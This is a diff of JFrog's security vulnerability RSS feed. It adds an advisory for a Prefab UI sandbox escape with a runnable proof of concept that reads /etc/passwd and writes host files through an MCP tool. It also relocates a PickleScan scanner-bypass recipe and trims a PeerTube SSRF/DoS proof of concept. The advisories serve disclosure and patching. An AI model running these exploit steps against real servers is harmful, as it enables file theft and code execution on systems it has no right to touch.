@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Sun, 01 Nov 2026 13:41:58 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 01 Nov 2026 15:35:11 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -555,6 +555,146 @@ https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
 https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
 https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/prefab-ui-is-vulnerable-to-remote-code-execution-via-a-pyodide-js-bridge-to-deno-cve-2026-120338-jfsa-2026-001699278/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/prefab-ui-is-vulnerable-to-remote-code-execution-via-a-pyodide-js-bridge-to-deno-cve-2026-120338-jfsa-2026-001699278/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120338, CRITICAL, Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno
+
+
+## Component
+
+prefab-ui (github.com/PrefectHQ/prefab)
+
+## Affected versions
+
+>= 0.14.0, < 0.21.0
+
+## Description
+
+Prefab UI's Generative UI sandbox runs caller-supplied Python inside Pyodide, which is Python compiled to WebAssembly, in a Deno subprocess. The feature is documented as isolation for untrusted code, including UI written by a model. `PyodideSandbox._start` in `src/prefab_ui/sandbox/_pyodide.py` starts that process with unrestricted `--allow-read`, `--allow-write`, and `--allow-net`. The runner in `src/prefab_ui/sandbox/runner.js` leaves the Deno API on the JavaScript global object. Pyodide's `js` module proxies that global, so the Python can call `Deno.readTextFileSync` and `Deno.writeTextFileSync` on the host. The runner comment and the public docs describe this process as read-only.
+
+The usual remote path is FastMCP's `GenerativeUI` provider. It registers the MCP tool `generate_prefab_ui` and forwards the tool's `code` argument into this sandbox. There is no extra check on that tool. On a FastMCP server with no authentication configured, any client who can reach the server can call it. With authentication, any client allowed to call tools can. The 10.0 score is the unauthenticated case. The same bug with an authenticated tool caller scores 9.9 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`). Generative UI is opt-in, and the host must have Deno installed. Servers that never execute untrusted code in this sandbox are not exposed.
+
+A caller who can submit the code can read and write files as the server OS user. On prefab-ui 0.20.2 the same write was used to plant a `.pth` file in the server virtualenv's `site-packages`, and the next Python process that used that environment ran the planted import. The sandbox shipped in 0.14.0 with those Deno permissions, and they were still present in 0.20.2. prefab-ui 0.21.0 revokes read, write, and network permission after startup, before it accepts code.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the vulnerable release**
+
+<br>
+
+Deno must be on `PATH`. The sandbox does not start without it.
+
+```
+pip install 'prefab-ui==0.20.2' 'fastmcp[apps]'
+```
+
+<br>
+
+**Step 2 - Start a FastMCP server with Generative UI and no authentication**
+
+<br>
+
+```
+from fastmcp import FastMCP
+from fastmcp.apps.generative import GenerativeUI
+
+mcp = FastMCP("poc")
+mcp.add_provider(GenerativeUI())
+mcp.run(transport="http", host="127.0.0.1", port=8127)
+```
+
+<br>
+
+**Step 3 - Call generate_prefab_ui**
+
+<br>
+
+The read returns the host file inside the rendered text. The write creates `/tmp/prefab-ui-sandbox-proof.txt`.
+
+```
+import asyncio
+from fastmcp import Client
+
+READ = """
+import js
+from prefab_ui.components import Text
+secret = js.Deno.readTextFileSync("/etc/passwd")
+leak = Text("EXFIL_BEGIN" + secret + "EXFIL_END")
+"""
+
+WRITE = """
+import js
+from prefab_ui.components import Text
+js.Deno.writeTextFileSync("/tmp/prefab-ui-sandbox-proof.txt", "owned\\n")
+done = Text("write-ok")
+"""
+
+async def main():
+    async with Client("http://127.0.0.1:8127/mcp/") as client:
+        print(await client.call_tool("generate_prefab_ui", {"code": READ}))
+        await client.call_tool("generate_prefab_ui", {"code": WRITE})
+
+asyncio.run(main())
+```
+
+<br>
+
+**Step 4 - Confirm the host file**
+
+<br>
+
+```
+cat /tmp/prefab-ui-sandbox-proof.txt
+```
+
+<br>
+
+Expected output on prefab-ui 0.20.2. The tool result contains the host passwd file between the markers, and the new file is on the host:
+
+```
+EXFIL_BEGIN
+# User Database
+...
+root:*:0:0:System Administrator:...
+EXFIL_END
+
+owned
+```
+
+<br>
+
+On prefab-ui 0.21.0 or later, the same read and write fail with a Deno permission error and do not return or create the host file.
+
+## Vulnerability Mitigations
+
+Upgrade prefab-ui to 0.21.0 or later. After the runtime and Prefab sources load, the runner revokes Deno filesystem read, filesystem write, and network permission before it accepts generated code. The process is started with `--no-prompt`, so a later permission request cannot grant them again, and bootstrap network access is limited to `cdn.jsdelivr.net:443`. FastMCP servers that register `GenerativeUI` pick up the fix by running that prefab-ui release.
+
+The change is https://github.com/PrefectHQ/prefab/pull/538, commit 030f074f85e0b1be0dd44b0283185aecb26337a2, released on 2026-10-26 as v0.21.0.
+
+Until the upgrade, do not register `GenerativeUI` on a server that untrusted clients can reach.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120338
+https://github.com/PrefectHQ/prefab/security/advisories/GHSA-595q-jv4r-q7j9
+https://github.com/PrefectHQ/prefab/pull/538
+https://github.com/PrefectHQ/prefab/commit/030f074f85e0b1be0dd44b0283185aecb26337a2
+https://github.com/PrefectHQ/prefab/releases/tag/v0.21.0
+https://pypi.org/project/prefab-ui/0.21.0/
+https://github.com/PrefectHQ/prefab/releases/tag/v0.20.2
+https://github.com/PrefectHQ/prefab/releases/tag/v0.14.0
+https://github.com/PrefectHQ/prefab
+https://pypi.org/project/prefab-ui/
 ]]></content:encoded>
         </item>
         <item>
@@ -2683,59 +2823,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PickleScan Bypass via File Extension Mismatch]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[PickleScan Bypass via File Extension Mismatch allows for evasion of malicious file detection.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-An Improper Input Validation vulnerability in the scanning logic of mmaitre314 picklescan versions up to and including 0.0.30 allows a remote attacker to bypass pickle files security checks by supplying a standard pickle file with a PyTorch-related file extension. When the pickle file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability exists in the `scan_bytes` function, which prioritizes file extension checks. If a file has a PyTorch-related extension (e.g., `.bin`), the scanner attempts to parse it using the `scan_pytorch` function. When a standard pickle file is given such an extension, this PyTorch-specific parsing fails. Crucially, the scanner then returns an error without falling back to a standard pickle analysis (`scan_pickle_bytes`). This logic gap allows a malicious standard pickle file, disguised with a mismatched extension, to evade detection.
-
-## PoC
-
-The following steps demonstrate how to bypass the scanner.
-
-```bash
-# 1. Download a known malicious pickle file.
-wget https://huggingface.co/kzanki/regular_model/resolve/main/model.pkl?download=true -O model.pkl
-
-# 2. Scan the original file. PickleScan correctly detects the threat.
-# Output will contain: dangerous import 'builtins exec' FOUND
-picklescan -p model.pkl
-
-# 3. Rename the file with a PyTorch-related extension.
-cp model.pkl model.bin
-
-# 4. Scan the renamed file.
-# The scan will fail with a PyTorch parsing error and NOT detect the malicious payload.
-picklescan -p model.bin
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-jgw4-cr84-mqxg)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10155)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
@@ -2831,6 +2918,59 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-f7qq-56ww-84cr)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10157)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PickleScan Bypass via File Extension Mismatch]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[PickleScan Bypass via File Extension Mismatch allows for evasion of malicious file detection.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+An Improper Input Validation vulnerability in the scanning logic of mmaitre314 picklescan versions up to and including 0.0.30 allows a remote attacker to bypass pickle files security checks by supplying a standard pickle file with a PyTorch-related file extension. When the pickle file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability exists in the `scan_bytes` function, which prioritizes file extension checks. If a file has a PyTorch-related extension (e.g., `.bin`), the scanner attempts to parse it using the `scan_pytorch` function. When a standard pickle file is given such an extension, this PyTorch-specific parsing fails. Crucially, the scanner then returns an error without falling back to a standard pickle analysis (`scan_pickle_bytes`). This logic gap allows a malicious standard pickle file, disguised with a mismatched extension, to evade detection.
+
+## PoC
+
+The following steps demonstrate how to bypass the scanner.
+
+```bash
+# 1. Download a known malicious pickle file.
+wget https://huggingface.co/kzanki/regular_model/resolve/main/model.pkl?download=true -O model.pkl
+
+# 2. Scan the original file. PickleScan correctly detects the threat.
+# Output will contain: dangerous import 'builtins exec' FOUND
+picklescan -p model.pkl
+
+# 3. Rename the file with a PyTorch-related extension.
+cp model.pkl model.bin
+
+# 4. Scan the renamed file.
+# The scan will fail with a PyTorch parsing error and NOT detect the malicious payload.
+picklescan -p model.bin
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-jgw4-cr84-mqxg)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10155)
 ]]></content:encoded>
         </item>
         <item>
@@ -3851,72 +3991,6 @@ This PoC assumes that there is a PeerTube instance on the machine listening on p
    This script will create, sign and send a Create Activity to **http://localhost:9000/inbox**.
 
 1. If everything was configured correctly, the PeerTube server won’t function normally anymore.
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32948 High severity. PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any attacker to cause the server to stop functioning, or in special cases send requests to arbitrary URLs (Blind SSRF).
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. Part of the parsing of playlist ActivityPub objects includes fetching the playlist elements. The function that gets the list of the playlist items to fetch is **fetchElementUrls**. It is called from **createOrUpdateVideoPlaylist**. Afterwards, the **rebuildVideoPlaylistElements** function is called, which in turn calls the **buildElementsDBAttributes**, that calls **fetchRemotePlaylistElement** for each element. If the activity has an object instead of a string in the **url** field, the object will eventually be passed into the **got** library that is used by PeerTube, and will be parsed as additional options for the fetch. If the object will have valid options, they will be used by the **got** libraries. Such an example could be **{“enableUnixSockets”: true, “url”: “unix:/….”}**, which will cause the library to fetch from a UNIX socket (which won’t be protected by the **got-ssrf** library). Also the HTTP method can be changed, and some other options. In the case that the key isn’t valid, an error will be thrown, and will later be thrown again by the **_destroy** function in **got**, and will not be caught, causing the server to crash.
-
-It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
-
-
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
-
-1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
-
-   ```
-   python malicious_rest_server.py
-   ```
-
-   This will start a server listening on port 1234.
-
-1. In another terminal, run the following command (insert the user token in the proper place):
-
-   ```
-   curl -v 'http://localhost:3000/api/v1/search/video-channels?search=http://localhost:1234/accounts/root_crash' -H 'Authorization: Bearer user_token'
-   ```
-
-   This technique is based on PeerTube’s search for channels. After fetching the outbox of a user, it will not be possible to ask for the same user again using this technique until the refresh interval will pass. This means that every time you want to run this curl command you should change something in the username (for example `http://localhost:1234/accounts/root1_crash` instead of `http://localhost:1234/accounts/root_crash`) .
 
 ## Vulnerability Mitigations
 
